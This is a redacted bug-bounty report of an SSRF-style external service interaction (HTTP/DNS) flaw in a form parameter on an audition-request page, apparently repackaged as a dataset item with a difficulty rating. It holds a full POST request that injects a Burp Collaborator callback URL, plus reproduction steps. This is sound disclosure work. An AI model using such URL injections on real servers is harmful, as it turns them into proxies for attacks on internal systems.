title: External Service Interaction (HTTP/DNS) on https://www.███  (██████████ parameter)
content:
Greetings, i've find a External service interaction (HTTP/DNS) on https://www.███████
Code 1.43 KiB
1External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, 
2such as a web or mail server. 
3The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, 
4and in some cases might even be the intended behavior of the application. 
5However, in many cases, it can indicate a vulnerability with serious consequences.
6
7In cases where DNS-based interactions can be triggered, it is normally possible to trigger interactions using other service types, 
8and these are reported as separate issues.
9 If a payload that specifies a particular service type (e.g. a URL) triggers only a DNS-based interaction, 
10then this strongly indicates that the application attempted to connect using that other service, 
11but was prevented from doing so by egress filters in place at the network layer. 
12The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. 
13By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
14This may include public third-party systems, internal systems within the same organization, 
15or services available on the local loopback adapter of the application server itself. Depending on the network architecture, 
16this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.
https://portswigger.net/kb/issues/00300200_external-service-interaction-dns
Full link : https://www.██████/█████
POST Request :
Code 377 Bytes
1████████&MONTH=01&LNAME=frenchvlad&PHONE=555-555-0199&EDULVL=10&STATE=AL&EMAILFLAG=on&submitButton=Submit+Audition+Request&EMAIL=frenchvlad@example.com&ADD1=555-555-0199@frenchvlad.com&██████=http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville&ADD2=555-555-0199@frenchvlad.com&INST1MOS=Bass+Guitar&CITY=Winterville&YEAR=2003&INST1YRS=2+TO+5&DAY=01&CITIZEN=R
my payload : █████████=http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville
Proof (DNS) :
██████
Proof (HTTP) :

best regards,
frenchvlad
Impact
We can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too
steps: Identify a parameter in the web application that accepts URLs or external service references (in this case, the '██████████' parameter).
Replace the parameter value with a Burp Collaborator URL (e.g., 'http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville').
Submit the modified request (POST request in this case) and monitor the Burp Collaborator for DNS/HTTP interactions.
Confirm the vulnerability by observing DNS/HTTP callbacks in the Burp Collaborator logs.
vuln_description: The vulnerability allows an attacker to induce the application to interact with arbitrary external services (HTTP/DNS). This can be exploited to use the server as an attack proxy, potentially leading to internal/external service attacks (e.g., DDoS).
reason: The attack involves a straightforward parameter manipulation to trigger external interactions. No complex application states, novel logic, or subtle interactions are required. The primary challenge is identifying the vulnerable parameter, which is a common testing step.
